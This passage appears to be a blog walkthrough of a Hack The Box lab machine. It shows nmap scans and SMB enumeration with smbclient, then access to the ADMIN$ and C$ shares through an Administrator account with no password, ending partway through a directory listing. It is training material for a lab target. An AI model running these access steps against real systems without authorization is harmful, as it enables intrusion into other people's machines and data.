</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?</em></p><p>We start out with a quick <strong>connection</strong> test.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.118.218 <span class=o>(</span>10.129.118.218<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.118.218: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.8 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.118.218: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.4 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.118.218: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.8 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.118.218: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span>10.6 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.118.218 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 10.392/10.645/10.836/0.174 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Running <em><strong>nmap</strong></em> without any options does not work, but it does in fact gives us a <strong>hint</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-10 22:18 BST
</span></span><span class=line><span class=cl>Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>0</span> hosts up<span class=o>)</span> scanned in 3.07 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>So let&rsquo;s <strong>try</strong> it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -Pn <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-10 22:21 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.118.218
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE
</span></span><span class=line><span class=cl>135/tcp open  msrpc
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 6.28 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p><strong>Three</strong> (top) <strong>ports</strong> appear to be <strong>open</strong>: <em>135</em>, <em>139</em> and <em>445</em>.</p><p>Let&rsquo;s check these reported <strong>services</strong> for some more information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -p135,139,445 -Pn -sC -sV <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-10 22:38 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.118.218
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.012s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>135/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds?
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-05-10T21:38:14
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   311: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 47.52 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><blockquote><p>-Pn</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What does the 3-letter acronym SMB stand for?</em></p><p>A quick <strong>online search</strong> can do wonders&mldr;</p><blockquote><p>server message block</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What port does SMB use to operate at?</em></p><p>Online <strong>research</strong>, just like in the previous task.</p><blockquote><p>445</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What command line argument do you give to `smbclient` to list available shares?</em></p><p>Using the command&rsquo;s built-in <strong>help option</strong> should gives us a hand here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient --help
</span></span><span class=line><span class=cl>Usage: smbclient <span class=o>[</span>OPTIONS<span class=o>]</span> service &lt;password&gt;
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>  -L, --list<span class=o>=</span>HOST                              Get a list of shares available on a host
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Trying out the default <em>Administrator</em> account and hoping that it is <strong>misconfigured</strong> (without any password) does not disappoint.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient -L <span class=nv>$rhost</span> -U Administrator
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\A</span>dministrator<span class=o>]</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	Sharename       Type      Comment
</span></span><span class=line><span class=cl>	---------       ----      -------
</span></span><span class=line><span class=cl>	ADMIN$          Disk      Remote Admin
</span></span><span class=line><span class=cl>	C$              Disk      Default share
</span></span><span class=line><span class=cl>	IPC$            IPC       Remote IPC
</span></span><span class=line><span class=cl>SMB1 disabled -- no workgroup available
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p><strong>Three</strong> <strong>shares</strong> are listed on our <strong>target</strong> machine.</p><blockquote><p>-L</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What character at the end of a share name indicates it's an administrative share?</em></p><p>Looking at the reported <strong>shares</strong> from TASK4, it must be $. But let&rsquo;s try and access the shares:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient //<span class=nv>$rhost</span>/ADMIN$ -U Administrator
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\A</span>dministrator<span class=o>]</span>:
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Mon Sep <span class=m>20</span> 17:02:48 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Mon Sep <span class=m>20</span> 17:02:48 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  <span class=nv>$Reconfig</span>$                          D        <span class=m>0</span>  Mon Sep <span class=m>20</span> 17:02:49 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ADFS                                D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:03 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  appcompat                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:00 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  apppatch                            D        <span class=m>0</span>  Mon Oct <span class=m>29</span> 22:39:47 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  AppReadiness                        D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:39:36 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  assembly                           DR        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:09:13 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  bcastdvr                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:00 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  bfsvc.exe                           A    <span class=m>78848</span>  Sat Sep <span class=m>15</span> 08:12:58 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Boot                                D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  bootstat.dat                       AS    <span class=m>67584</span>  Wed May <span class=m>10</span> 22:15:58 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  Branding                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  CbsTemp                             D        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:00:03 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Containers                          D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Cursors                             D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  debug                               D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:17:15 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  diagnostics                         D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  DigitalLocker                       D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:05:40 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Downloaded Program Files           DS        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  drivers                             D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  DtcInstall.log                      A     <span class=m>1947</span>  Wed Apr <span class=m>21</span> 16:16:44 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ELAMBKUP                           DH        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  en-US                               D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:05:40 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  explorer.exe                        A  <span class=m>4245280</span>  Mon Oct <span class=m>29</span> 22:39:24 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Fonts                             DSR        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Globalization                       D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Help                                D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:05:40 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  HelpPane.exe                        A  <span class=m>1065472</span>  Sat Sep <span class=m>15</span> 08:12:46 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  hh.exe                              A    <span class=m>18432</span>  Sat Sep <span class=m>15</span> 08:12:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  IdentityCRL                         D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  IME                                 D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:05:40 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ImmersiveControlPanel              DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:16:42 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  INF                                 D        <span class=m>0</span>  Wed May <span class=m>10</span> 22:09:44 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  InputMethod                         D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Installer                         DHS        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:05:00 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  L2Schemas                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  LiveKernelReports                   D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Logs                                D        <span class=m>0</span>  Tue Sep <span class=m>21</span> 17:33:25 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  lsasetup.log                        A     <span class=m>1380</span>  Wed Apr <span class=m>21</span> 16:16:02 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  media                             DSR        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  mib.bin                             A    <span class=m>43131</span>  Sat Sep <span class=m>15</span> 08:12:40 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Microsoft.NET                      DR        <span class=m>0</span>  Wed May <span class=m>10</span> 22:15:59 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  Migration                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ModemLogs                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  notepad.exe                         A   <span class=m>254464</span>  Sat Sep <span class=m>15</span> 08:12:38 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  OCR                                 D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:07:04 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Offline Web Pages                  DR        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:05 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Panther                             D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:16:50 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Performance                         D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  PFRO.log                            A     <span class=m>1708</span>  Mon Sep <span class=m>27</span> 11:26:45 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  PLA                                 D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  PolicyDefinitions                   D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:08:05 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Prefetch                           Dn        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:16:20 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  PrintDialog                        DR        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:16:43 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Provisioning                        D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  regedit.exe                         A   <span class=m>358400</span>  Sat Sep <span class=m>15</span> 08:12:52 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Registration                        D        <span class=m>0</span>  Wed May <span class=m>10</span> 22:05:37 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  RemotePackages                      D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  rescache                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Resources                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  SchCache                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  schemas                             D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  security                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ServerStandard.xml                  A    <span class=m>30931</span>  Sat Sep <span class=m>15</span> 08:13:27 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ServiceProfiles                     D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:16:04 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  ServiceState                        D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  servicing                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 10:06:36 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Setup                               D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:21:38 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ShellComponents                     D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:05 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  ShellExperiences                    D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:05 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  SKB                                 D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  SoftwareDistribution                D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:54 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Speech                              D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Speech_OneCore                      D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  splwow64.exe                        A   <span class=m>132096</span>  Sat Sep <span class=m>15</span> 08:13:30 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  System                              D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  system.ini                          A      <span class=m>219</span>  Sat Sep <span class=m>15</span> 08:16:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  System32                            D        <span class=m>0</span>  Wed May <span class=m>10</span> 22:09:44 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  SystemApps                          D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  SystemResources                     D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  SysWOW64                            D        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:04:43 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  TAPI                                D        <span class=m>0</span>  Tue Sep <span class=m>21</span> 17:51:49 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Tasks                               D        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:16:18 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Temp                                D        <span class=m>0</span>  Wed May <span class=m>10</span> 22:16:17 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  TextInput                           D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:14 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  tracing                             D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  twain_32                            D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:14 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  twain_32.dll                        A    <span class=m>64512</span>  Sat Sep <span class=m>15</span> 08:13:11 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Vss                                 D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  WaaS                                D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  Web                                 D        <span class=m>0</span>  Sat Sep <span class=m>15</span> 08:19:01 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  win.ini                             A       <span class=m>92</span>  Sat Sep <span class=m>15</span> 08:16:48 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  WindowsShell.Manifest             AHR      <span class=m>670</span>  Sat Sep <span class=m>15</span> 08:12:40 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  WindowsUpdate.log                   A      <span class=m>276</span>  Wed May <span class=m>10</span> 22:05:41 <span class=m>2023</span>
</span></span><span class=line><span class=cl>  winhlp32.exe                        A    <span class=m>11776</span>  Sat Sep <span class=m>15</span> 08:13:11 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  WinSxS                              D        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 18:46:29 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  WMSysPr9.prx                        A   <span class=m>316640</span>  Sat Sep <span class=m>15</span> 08:12:02 <span class=m>2018</span>
</span></span><span class=line><span class=cl>  write.exe                           A    <span class=m>11264</span>  Sat Sep <span class=m>15</span> 08:12:55 <span class=m>2018</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=m>3774463</span> blocks of size 4096. <span class=m>1156502</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> <span class=nb>pwd</span>
</span></span><span class=line><span class=cl>Current directory is <span class=se>\\</span>10.129.118.218<span class=se>\A</span>DMIN$<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>smb: <span class=se>\&gt;</span> <span class=nb>exit</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It looks like the <em>ADMIN$</em> <strong>share</strong> contains the <strong>Windows system</strong> files. How about the other <strong>two</strong>?</p><p>We get <strong>lucky</strong> once we look around the <em>C$</em> <strong>share</strong>. We find the final <strong>flag</strong>, located at - \\$rhost\C$\Users\Administrator\Desktop\flag.txt -, so we <strong>download</strong> it to our <strong>local</strong> machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbclient //<span class=nv>$rhost</span>/C$ -U Administrator
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\A</span>dministrator<span class=o>]</span>:
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  <span class=nv>$Recycle</span>.Bin                      DHS        <span class=m>0</span>  Wed Apr <span class=m>21</span> 16:23:49 <span class=m>2021</span>
</span></span><span class=line><span class=cl>  Config.Msi                        DHS        <span class=m>0</span>  Wed Jul  <span class=m>7</span> 19:04:56 <span class=m>2021</span>
